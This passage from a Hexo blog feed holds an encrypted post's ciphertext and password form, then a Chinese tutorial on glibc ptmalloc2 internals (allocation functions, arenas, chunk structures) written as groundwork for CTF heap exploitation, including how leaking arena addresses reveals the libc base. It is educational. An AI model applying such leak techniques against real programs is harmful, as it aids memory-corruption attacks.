deaf2aee8743ced335433bd0ac1e6305d17c3b675325a298a328580f1acb7372650bdf7eebdc046d7410b170b00b306ed3f648d4016cc3361ce163391700f284e160d06c1402d9e36d4c6a1c084b1a2234eea25b056ac9628d16c40cf73f8eb14971adfc54b78c4c63aac70684150205fb51e23bfa7f9e14fe1e89716ff6e51103aba2aad31d329d21a38c1678fe219a4942d41f84281d8876c16b0e249dd756481f168e85380722d845423bc001577db67525e9d1a941cd5f7b7f6c4da56c3bedf9ce7edd5f4e8dffdb876f0a682b7b1032772f93719e90c1cdc5c54784321ffc1961f66ecc2660b64cfe69904b6ada08cf165bdcf260c53d60ed7b18c2aca079f197eee19d01a7c5acd0e743fec3bae9be57d458befb4bc194890b0d8e6c06e18261fbdc6eed7fe052b0ede98aafab94e9b8438f955c254989665281381d1c78258defc4dc7e99c6de9645af4a5c5ba628e07414c438fdbb826032c4dffc757a4477c056f17c471fbb6073b54eea5bcf8543ed3f4642a2c6abd28380c5891d725d29c69e8662c247282d105b720e32a1cb08d18f7d842ddb95c2caf8352a78b704d0210b7f0247196037b010c5d918ceb890b17247b79e2f657eb35cd04be667d661327bae5cdbe7f0fc66f7cda46c0383f559abc3f244fef09753f4157e86e2ac2e5a91bb4158d523ea80fc8955e60dad67d50418d42ab578bd85728ffd38c96df0a6d96376ca0ed7d666be3c7f843cca8892c152ce87126c45f7c6be4dbdde08371423443ad223e7c0db89288dddbfc1e98501064f05f0b56e640026d46b89d28c552f9a1dda809289cff3ec5360e14ff921269e02819663cf986e335edc725d80dbed481deed0d0eb133b89a06082c188c5699f8aba0a5c432cdc59ab0ccdeb03ec61a8f7c565a72e8120a407f89adde3d9a441650739402ec7c923e31f4be1098bc6c0d54d48829c02ffc72ce431221e6ca65fb53557796a3b6629c805f742eb1ec0e75b98f04bb00c41236ce7938a291e3567250c0b061d995e187a173e7cb8118ae5edd42a9f303fc9d2c1aff3e4b12625d28a88cb8d4d25dd3c0a56e4f737ebdbd79b171ad5e0dd5e62be526cc29a39b326ce53fd414c56bbb760d6988e47564addeeb28e94709a543e107eafbb8cc80db6877f86cf88d1905155611418fdd74125c8be22994f48b0ca59bc3df8418d74393061959583205a7fc0961dac3051ed8cb1236bc0f3e424c7322abe52bb832705df44a5a1816fa3caf0e56260ec36209e03e82382a146767d03285dfc739823dc07ffcabd99e57bbf052ea201762b297958e9a2319a14df8415755308ec3988d526ca2e4fd70ccb1e3d60e02a3f3d75112088224fff6393e7b3a23f111c74faa37859778da1d480af141d3219fa0f49ed9163040057282ecfb4d29cc3d6e699d6752b8b489fd6d465e0a8ba8af02e20790fcf13ba8de6652970ecd4c6b12c03449e5a479edc31f7d34d5577d7c1547c46fe19d42db6f4213e8cc3c1cc155373981de846ddb396fbe94abeece21d7eaeabaff8f05109ffc4ee0c22f1f678afc90914c64599d1103f0ed98f8f6356f98e56aa32934ee953513994ac80a666d881d8077a0924116df3d709a90d7976ee478b71d00fc1ef4970f83e3deb54664d094fb63e087eade4f734aeb6e7bdf63726f81d98d063ef758c75183dfd8294d3f25487830fd443aa4cb73563b0c4aa5cd54169668aafea1d98bd46777fc60efa18e144bc2768452e2377b35bd64e8c5c2ac555a30c0e5c14d03344097cd363aa3be6a8c61852cd8d2a04af154b5efe9060fdface51fbd0c0432364c7b62431f2c07106444f41f791582e636190a50b8ddde5ff0a162e5ccf8fc88d4e165732e99c051db0b05e7312c04b588ae38e1ddbd7f487a419d960f10379ff10fbe7026fb427de491e365b973be26d2cccd94361786687ac4dc627a4408127ef4444b4a447f6370533f5a17b6102e6ae51630a703a7251f4fd3046033ca6e4b2d7ddc39a90e6abc52ff7cd6f9793aba49af071ea545fcde8c9e4254537a9d3f8c5760ef8c48497e0011e4d7ea1d81745da0cea62ab388a0e2ddb6adc5d3dccd68be0a49a348fb99b960e328c79829f4089e70956b94c172e69c1ffd93aba3b18867e5d14e7b0669b7d418adb2de860d4e87dec51c02c3f6942bf6d867bf0a79499057f07422f0a7482758dcfa7e165a50569e5d0f7d91dd681dbe57910ccf93110e081eaafc25565819b0ab0913032761526cd939dbbaa9c9735c4c78495c05a63d455c67d715dcbf69fcbe73cf733a23e50afe02d15bfbe2d0e90469bef6f8c18b1b99c5490327fb2322fe6e1b8f5c5054f8777fa8e439284c622c3f414be744bc08c35d187ca68cd61ed4a23d114ddd96c95d68ed720a7fc503b8aa5ff77505834efa82e45d49fcc78daca9f57ceb8380f569365aec030ab3b2c8790f10a4356405ea067788404968fb28de0a17b4457e4ded13809b9ad9425f4d86f30e73732be62b24d859a48f92f76ed4d33c85a3399a82e47</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
  </entry>
  <entry>
    <title>linux 堆利用基础知识</title>
    <url>/2024/11/08/linux-heap-exploit-basic-knowlege/</url>
    <content><![CDATA[<p>ptmalloc2 是目前 Linux 标准发行版中使用的堆分配器。</p>
<h1 id="内存分配基本思想"><a href="#内存分配基本思想" class="headerlink" title="内存分配基本思想"></a>内存分配基本思想</h1><ul>
<li>堆管理器负责向操作系统申请内存，然后将其返回给用户程序，但是频繁的系统调用会造成大量的开销。为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ul>
<h1 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p><code>malloc</code> (memory allocation) 函数是 C 语言标准库中用于动态内存分配的一个基本函数。它分配一块至少为 size 字节的连续内存区域，并返回一个指向这块内存的指针</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>
<p><code>malloc</code> 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理：</p>
<ul>
<li>当 <code>n = 0</code> 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 <code>n</code> 为负数时，由于在大多数系统上，<code>size_t</code> 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><p><code>realloc</code> 函数用于重新分配之前通过 <code>malloc</code> ，<code>calloc</code> 或 <code>realloc</code> 函数分配的内存区域。它可以改变内存块的大小，或者释放内存块，或分配新的内存块。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>ptr</code>：指向需要重新分配的内存块的指针。</li>
<li><code>size</code>：新的内存块的大小，以字节为单位。</li>
</ul>
<p>有如下情况：</p>
<ul>
<li><code>ptr</code> 不为空，<code>size = 0</code> ，相当于释放原来的堆块。</li>
<li><code>ptr</code> 为空且 <code>size &gt; 0</code> ，相当于 <code>malloc</code> 。</li>
<li><code>ptr</code> 不为空，<code>size</code> 大于原来的堆块大小则如果该堆块后面的堆块空闲则合并堆块，否则先释放原堆块，然后再申请一个更大的堆块，原堆块内容会被拷贝过去。</li>
<li><code>ptr</code> 不为空，<code>size</code> 不大于原来的堆块大小，如果切割后剩下的堆块大于等于 <code>MINSIZE</code> 则切割并释放，然后返回原堆块。</li>
</ul>
<h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><p><code>calloc</code> (contiguous allocation) 函数是 C 语言标准库中用于动态内存分配的一个函数。与 <code>malloc</code> 相似，<code>calloc</code> 用于分配内存。该函数在分配时会清空 <code>chunk</code> 上的内容，这使得我们无法通过以往的重复存取后通过 <code>chunk</code> 上残留的脏数据的方式泄露信息（例如通过 <code>bins</code> 数组遗留的脏数据泄露 libc 基址等），同时该函数不从 <code>tcache</code> 中拿 <code>chunk</code>，但是 <code>free()</code> 函数默认还是会先往 <code>tcache</code> 里放的，这无疑增加了我们利用的难度。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>nmemb</code>：需要分配的元素个数。</li>
<li><code>size</code>：每个元素的大小，以字节为单位。</li>
</ul>
<p>总的分配的字节大小是 <code>nmemb * size</code> 。</p>
<p><strong>注意：如果 size 的 IS_MAPPED 位置 1 则不清空数据。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p>
<p>此外，该函数也同样对异常情况进行了处理：</p>
<ul>
<li>当 p 为空指针时，函数不执行任何操作。</li>
<li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。</li>
<li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li>
</ul>
<h2 id="mallopt"><a href="#mallopt" class="headerlink" title="mallopt"></a>mallopt</h2><p><code>mallopt</code> 函数通过控制堆的特定参数用于改变堆的分配策略。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mallopt</span><span class="params">(<span class="type">int</span> param,<span class="type">int</span> value)</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>param</code>：指定要修改的动态内存分配参数。这个参数是一个整数，定义了哪一个特性将会被修改。例如，它可以是控制内存对齐、缓存大小或者相似行为的选项。<ul>
<li><code>M_MXFAST</code>：设置 <code>malloc</code> 用于小块内存分配的最大 fast bin 的大小。</li>
<li><code>M_TRIM_THRESHOLD</code>：设置 <code>sbrk</code> 释放内存回操作系统的阈值。</li>
<li><code>M_TOP_PAD</code>：设置 <code>sbrk</code> 请求额外内存时，上面的额外内存量。</li>
<li><code>M_MMAP_THRESHOLD</code>：设置使用 <code>mmap</code> 进行内存分配的阈值。</li>
<li><code>M_MMAP_MAX</code>：设置可以使用 <code>mmap</code> 进行内存分配的最大数目。</li>
</ul>
</li>
<li><code>value</code>：新的值，针对 param 指定的特性。具体的值取决于 param，有些特性可能需要非零值来启用，零值来禁用，有些则需要具体的数值。</li>
<li>返回值是一个整数，指示函数调用是否成功。<ul>
<li>如果成功，返回非零值。</li>
<li>如果失败（例如，不支持的参数或值），返回零。</li>
</ul>
</li>
</ul>
<h1 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h1><p>内存管理函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。<br>在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/7b0091679197656e97d7a468abccb56d.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h2><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p>
<p>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。<br>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/4a281327dd16657c32c2916e176a2c99.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p>
<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><h2 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h2><p>在 ptmalloc 中使用 <code>malloc_par</code> 结构体来记录堆管理器的相关参数，该结构体定义于 <code>malloc.c</code> 中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_par</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;</span><br><span class="line">  <span class="type">int</span> n_mmaps_max;</span><br><span class="line">  <span class="type">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  sbrked_mem;*/</span></span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  max_sbrked_mem;*/</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_total_mem;  <span class="comment">/* only kept for NO_THREADS */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>主要是定义了和 <code>mmap</code> 和 <code>arena</code> 相关的一些参数（如数量上限等），以及 <code>sbrk</code> 的基址，其中重要的参数解释如下：</p>
<ul>
<li><code>top_pad</code>：初始化或扩展堆的时候需要多申请的内存大小。</li>
<li><code>mmap_threshold</code>：决定 <code>sysmalloc</code> 是通过 <code>mmap</code> 还是 <code>sbrk</code> 分配内存的界限，即如果申请的内存大小不小于该值则采用 <code>mmap</code> 分配，否则采用 <code>sbrk</code> 扩展 <code>heap</code> 区域分配。并且这个值是动态调整的，如果释放的内存是通过 <code>mmap</code> 得到的则 <code>mmap_threshold</code> 与该内存大小取 <code>max</code> 。并且 <code>mmap_threshold</code> 最大不能超过 <code>DEFAULT_MMAP_THRESHOLD_MAX</code> ，即 0x2000000 。</li>
<li><code>trim_threshold</code>：用于 <code>main_arena</code> 中保留内存量的控制。当释放的 <code>chunk</code> 为 <code>mmap</code> 获得的，同时大小大于 <code>mmap_threshold</code> ，则除了更新 <code>mmap_threshold</code> 外还会将 <code>trim_threshold</code> 乘 2 。当释放的 <code>chunk</code> 大小不在 fast bin 范围合并完 <code>size</code> 大于 <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 即 0x10000 ，且为 <code>main_arena</code> ，且 top chunk 的大小大于 <code>trim_threshold</code> 则将 <code>heap</code> 区域在 top chunk 不会小于 <code>pagesize</code> 的前提下减小 <code>top_pad</code> 。</li>
<li><code>n_mmaps</code>：<code>mmap</code> 的内存数量，即 ptmalloc 每次成功 <code>mmap</code> 则 <code>n_mmaps</code> 加 1，ptmalloc 每次成功 <code>munmap</code> 则 <code>n_mmaps</code> 减 1 。</li>
<li><code>n_mmaps_max</code>：<code>n_mmaps</code> 的上限，即最多能 <code>mmap</code> 的内存数量。</li>
<li><code>max_n_mmaps</code>：<code>n_mmaps</code> 达到过的最大值。</li>
<li><code>mmapped_mem</code>：当前 <code>mmap</code> 的内存大小总和。</li>
<li><code>max_mmapped_mem</code>：<code>mmap</code> 的内存大小总和达到过的最大值。</li>
<li><code>sbrk_base</code>：表示通过 <code>brk</code> 系统调用申请的 <code>heap</code> 区域的起始地址。</li>
<li><code>no_dyn_threshold</code>：表示是否禁用 <code>heap</code> 动态调整保留内存的大小，默认为 0 。</li>
</ul>
<p>该结构体类型的实例 <code>mp_</code> 用以记录 ptmalloc 相关参数，同样定义于 <code>malloc.c</code> 中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DEFAULT_TOP_PAD 131072 <span class="comment">// 0x20000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_MAX       (65536) <span class="comment">// 0x10000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN <span class="comment">// 0x20000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_TRIM_THRESHOLD (128 * 1024) <span class="comment">// 0x20000</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">malloc_par</span> mp_ =</span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = <span class="built_in">NARENAS_FROM_NCORES</span> (<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h2><p><code>heap_info</code> 位于一个 <code>heap</code> 块的开头，用以记录通过 <code>mmap</code> 系统调用从 Memory Mapping Segment 处申请到的内存块的信息。定义于 <code>arena.c</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>

<p><code>heap_info</code> 结构体的成员如下：</p>
<ul>
<li><code>ar_ptr</code>：指向管理该堆块的 arena</li>
<li><code>prev</code>：该heap_info所链接的上一个 heap_info</li>
<li><code>size</code>：记录该堆块的大小</li>
<li><code>mprotect_size</code>：记录该堆块中被保护（<code>mprotected</code>）的大小</li>
<li><code>pad</code>：即 <code>padding</code> ，用以在 <code>SIZE_SZ</code> 不正常的情况下进行填充以让内存对齐，正常情况下 <code>pad</code> 所占用空间应为 0 字节</li>
</ul>
<h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><p>大部分情况下对于每个线程而言其都会单独有着一个 <code>arena</code> 实例用以管理属于该线程的堆内存区域。<code>ptmalloc</code> 内部的内存池结构是由 <code>malloc_state</code> 结构体进行定义的，即 <code>arena</code> 本身便为 <code>malloc_state</code> 的一个实例对象。<br><code>malloc_state</code> 结构体定义于<code>malloc/malloc.c</code> 中，代码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>malloc_state</code> 结构体的成员如下：</p>
<ul>
<li><code>mutex</code>：<code>mutex</code> 变量即为多线程互斥锁，用以保证线程安全。</li>
<li><code>flags</code>：标志位，用以表示 <code>arena</code> 的一些状态，如：是否有 <code>fastbin</code> 、内存是否连续等。</li>
<li><code>fastbinY</code>：存放 fastbin chunk 的数组。</li>
<li><code>top</code>：指向 Top Chunk 的指针。</li>
<li><code>last_remainder</code>：<code>chunk</code> 切割中的剩余部分。<code>malloc</code> 在分配 <code>chunk</code> 时若是没找到 <code>size</code> 合适的 <code>chunk</code> 而是找到了一个 <code>size</code> 更大的 <code>chunk</code> ，则会从大 <code>chunk</code> 中切割掉一块返回给用户，剩下的那一块便是 <code>last_remainder</code> ，其随后会被放入 unsorted bin 中。</li>
<li><code>bins</code>：存放闲置 <code>chunk</code> 的数组。<code>bins</code> 包括 large bin，small bin 和 unsorted bin 。</li>
<li><code>binmap</code>：记录 <code>bin</code> 是否为空的 <code>bitset</code> 。需要注意的是 <code>chunk</code> 被取出后若一个 <code>bin</code> 空了并不会立即被置 0 ，而会在下一次遍历到时重新置位。</li>
<li><code>next</code>：指向下一个 <code>arena</code> 的指针。一个进程内所有的 <code>arena</code> 串成了一条循环单向链表，<code>malloc_state</code> 中的 <code>next</code> 指针便是用以指向下一个 <code>arena</code> ，方便后续的遍历  <code>arena</code> 的操作（因为不是所有的线程都有自己独立的 <code>arena</code> ）。</li>
<li><code>next_free</code>：指向下一个空闲的 <code>arena</code> 的指针。与 <code>next</code> 指针类似，只不过指向的是空闲的 <code>arena</code>（即没有被任一线程所占用）。</li>
<li><code>attached_threads</code>：与该 <code>arena</code> 相关联的线程数。该变量用以表示有多少个线程与该<code>arena</code> 相关联，这是因为 <code>aerna</code> 的数量是有限的，并非每一个线程都有机会分配到一个<code>arena</code>，在线程数量较大的情况下会存在着多个线程共用一个 <code>arena</code> 的情况。</li>
<li><code>system_mem</code>：记录当前 <code>arena</code> 在堆区中所分配到的内存的总大小。</li>
<li><code>max_system_mem</code>：当操作系统予进程以内存时，<code>system_mem</code> 会随之增大，当内存被返还给操作系统时，<code>sysyetm_mem</code> 会随之减小，<code>max_system_mem</code> 变量便是用来记录在这个过程当中 <code>system_mem</code> 的峰值。</li>
</ul>
<p><code>main_arena</code> 为一个定义于 <code>malloc.c</code> 中的静态的 <code>malloc_state</code> 结构体。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">malloc_state</span> main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>由于其为 libc 中的静态变量，该 <code>arena</code> 会被随着 libc 文件一同加载到 Memory Mapping Segment。因此在堆题中通常通过泄露 <code>arena</code> 的地址以获得 libc 在内存中的基地址。</p>
<h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>在程序的执行过程中，我们称由 <code>malloc</code> 申请的内存为 <code>chunk</code> 。这块内存在 <code>ptmalloc</code> 内部用 <code>malloc_chunk</code> 结构体来表示。当程序申请的 <code>chunk</code> 被 <code>free</code> 后，会被加入到相应的空闲管理列表中。<br><code>malloc_chunk</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>每个字段的具体的解释如下：</p>
<ul>
<li><p><code>prev_size</code>：如果物理相邻的前一地址 <code>chunk</code> 是空闲的话，那该字段记录的是前一个 <code>chunk</code> 的大小 (包括 <code>chunk</code> 头)。否则，该字段可以用来存储物理相邻的前一个 <code>chunk</code> 的数据。</p>
</li>
